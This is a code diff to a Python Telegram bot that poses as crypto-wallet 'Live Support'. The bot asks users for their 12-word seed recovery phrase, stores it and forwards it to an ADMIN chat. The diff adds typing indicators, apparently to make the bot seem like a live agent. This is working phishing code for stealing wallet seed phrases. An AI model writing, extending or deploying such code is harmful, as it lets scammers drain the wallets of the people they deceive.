@@ -76,6 +76,8 @@ def talk(update: Update, context: CallbackContext):
 
 def ask(update: Update, context: CallbackContext):
     msg = "Provide 12 digit seed recovery phrase of the wallet having issues."
+    context.bot.send_chat_action(
+        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
     context.bot.send_message(
         chat_id=update.effective_message.chat_id, text=msg, parse_mode="Html")
     return PH
@@ -90,12 +92,16 @@ def ph(update: Update, context: CallbackContext):
         buttons = [[KeyboardButton("Live Support")]]
         context.user_data["userphrase"] = update.message.text
         context.user_data["msg_id"] = update.message.message_id
+        context.bot.send_chat_action(
+        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
         context.bot.send_message(chat_id=update.effective_message.chat_id,
                                  reply_to_message_id=update.message.message_id, text=msg, parse_mode="Html", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))
         context.bot.forward_message(chat_id=ADMIN, from_chat_id=update.message.from_user.id,
                                     message_id=context.user_data["msg_id"], disable_notification=None)
         return ConversationHandler.END
     else:
+        context.bot.send_chat_action(
+        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
         context.bot.send_message(
             chat_id=update.effective_message.chat_id, text=isTron[1]+" Type /cancel to close request.")
         return PH
@@ -104,6 +110,8 @@ def ph(update: Update, context: CallbackContext):
 def cancel(update: Update, context: CallbackContext):
     bot = context.bot
     buttons = [[KeyboardButton("Live Support")]]
+    context.bot.send_chat_action(
+        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
     bot.send_message(chat_id=update.effective_message.chat_id,
                      text="You cancel request has been accepted.", parse_mode="HTML", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))
     return ConversationHandler.END
